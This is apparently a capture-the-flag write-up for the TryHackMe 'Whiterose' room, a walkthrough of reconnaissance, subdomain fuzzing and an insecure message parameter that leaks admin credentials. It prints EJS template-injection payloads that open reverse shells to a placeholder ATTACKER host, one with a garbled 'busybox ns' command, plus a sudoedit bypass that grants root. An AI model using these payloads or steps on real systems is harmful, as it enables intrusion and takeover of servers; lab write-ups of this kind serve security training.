---
title: "Whiterose"
date: 2024-11-10
draft: false
summary: "Writeup for Whiterose CTF challenge on TryHackMe."
tags: ["linux", "rce", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/whiterose/cover.webp"
  caption: "Whiterose TryHackMe Challenge"
  alt: "Whiterose cover"
platform: "TryHackMe"
---

Yet another Mr. Robot themed challenge.
<!--more-->
To access the challenge, click on the link given below:
- https://tryhackme.com/r/room/whiterose

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on them.

```shell
nmap -A -p- TARGET -oN whiterose.nmap --min-rate 10000 -Pn
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/whiterose/1.webp)

I also saved the credentials that were given to me by the creator.

```
Olivia Cortez:olivi8
```

## Initial Foothold

Since the **nmap** scan revealed port 80 to be running, I tried to access it through my browser but couldn't do so as the domain was not being identified. Hence, I manually mapped the domain to the machine IP in the **`/etc/hosts`** file.

I then tried accessing the website.

![](https://cdn.ziomsec.com/whiterose/2.webp)

The home page revealed nothing interesting, so I tried brute forcing available subdomains.

```shell
ffuf -u http://cyprusbank.thm -H 'Host: FUZZ.cyprusbank.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1
```

![](https://cdn.ziomsec.com/whiterose/3.webp)

**Note** : *I initially tried fuzzing subdomains using `FUZZ.cyprus.thm` as the target without specifying the `Host` header but this didn't work. So I looked around on the internet and found a better way of performing subdomain fuzzing. Here's a breakdown simple explanation and purpose of the above command:*
- *The `/etc/hosts` entry maps the IP to a particular domain. This IP is only mapped to that particular domain and not to any subdomains related to it unless explicitly mentioned.*
- *The HTTP `Host` header is a part of web requests that tells the server which website the client wants to connect to. So if I type example.com, the browser sends a request with `Host: example.com` header.*
- *So I can use this mechanism to check if a particular IP has a subdomain in it by looking for different `Host` header values on a domain.*
- *Also, `-fw 1` Filters out responses with 1 word in the response, typically used to ignore consistent error responses.*

After finding a subdomain, I mapped it in the `/etc/hosts` file.

I navigated to the **admin** panel that I had discovered and tried logging in using the credentials that I had been given at the start.

![](https://cdn.ziomsec.com/whiterose/4.webp)

I logged in as **Olivia** and was able to view information about customers and their transactions.

![](https://cdn.ziomsec.com/whiterose/5.webp)

I looked in the *Messages* tab and found a bunch of messages.

![](https://cdn.ziomsec.com/whiterose/6.webp)

From the url, I found that the page displayed messages based on the parameter **`c`**. So I tried changing its value to view more messages. On `c=10`, I found the credentials of the privileged admin account.

![](https://cdn.ziomsec.com/whiterose/7.webp)

I used these credentials to log in as a privileged user. Now I could view information that was hidden from **Olivia**.

![](https://cdn.ziomsec.com/whiterose/8.webp)

I visited the *Settings* tab and found an option to change user passwords. I tried changing password of **Terry Colby**.

![](https://cdn.ziomsec.com/whiterose/9.webp)

However, it didn't actually work. I couldn't log in as **Terry** with the new password. So I sent another request and analyzed it on **Burp Suite**.

![](https://cdn.ziomsec.com/whiterose/10.webp)

I analyzed the application behavior for different password values. I tested for SQL injection and empty password field but got no response in return.

However, when I removed the **password** field altogether, I received an error that revealed backend information.

![](https://cdn.ziomsec.com/whiterose/11.webp)

 The error message specified `settings.ejs`. I did not know much about `ejs` so I asked **chatgpt**.

> EJS (Embedded JavaScript) is a templating engine for Node.js. It allows you to embed JavaScript code within HTML and helps you generate HTML markup with dynamic content. With EJS, you can create reusable templates that render data passed from the server, making it easier to build dynamic web applications.

Next, I looked for exploits on google and found a bunch  addressing a remote code execution vulnerability. I then looked for **rce** exploits and found a bunch of articles.
- https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

```
http://TARGET/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh ATTACKER 1234');s
```

I appended the payload to my request and forwarded it. However, the **nc** version on the server did not support the `-e` argument.

![](https://cdn.ziomsec.com/whiterose/12.webp)

Since, normal `nc` didn't work, I visited **revshells** to look for other ways. The `busybox` payload worked.
- https://www.revshells.com

```
http://TARGET/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox ns ATTACKER 1234 -e /bin/bash');s
```

![](https://cdn.ziomsec.com/whiterose/13.webp)

Before forwarding the payload, I had started a reverse shell listener. Upon execution, I received a reverse shell.

![](https://cdn.ziomsec.com/whiterose/14.webp)

I found the first flag in the *web* user's `home` directory.

```
cat /home/web/user.txt
```

![](https://cdn.ziomsec.com/whiterose/15.webp)

## Privilege Escalation

I listed the **sudo** privileges of the user and found it could edit a configuration file.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/whiterose/16.webp)

> The shell was super buggy and unstable, so I spawned a more robust shell using the following steps:
> - background current session using `ctrl+z`
> - enter: `stty raw -echo; fg`

I did not have any idea as to what had to be done. So I looked for ways I could use the available command to escalate my privilege.

I found an article that demonstrated a way to exploit this configuration.
- https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis

Hence I followed the steps to set **vim** as the default editor for **/etc/sudoers** file.

```bash
export EDITOR="vim -- /etc/sudoers"
```

![](https://cdn.ziomsec.com/whiterose/17.webp)

![](https://cdn.ziomsec.com/whiterose/18.webp)

I then executed the available command.

```shell
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

![](https://cdn.ziomsec.com/whiterose/19.webp)

This opened the **/etc/sudoers** file in **vim** editor. I simply allowed my user to execute all commands without a password similar to the **root** by adding the below statement.

```bash
web ALL=(ALL:ALL) NOPASSWD: ALL
```

![](https://cdn.ziomsec.com/whiterose/20.webp)

Finally, I switched user using **sudo** to become **root** and captured the final flag from the **`/root`** directory.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/whiterose/21.webp)

That's it from my side! Until next time :)

---
